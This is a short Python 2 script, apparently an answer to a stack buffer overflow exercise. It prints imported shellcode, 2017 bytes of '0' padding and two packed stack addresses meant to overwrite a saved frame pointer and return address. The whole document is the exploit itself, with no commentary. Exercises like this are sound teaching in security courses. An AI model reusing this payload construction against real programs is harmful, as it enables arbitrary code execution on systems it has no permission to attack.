from shellcode import shellcode
from struct import pack

print shellcode+"0"*2017+pack("<I", 0xbffec4e0)+pack("<I", 0xbffeccec)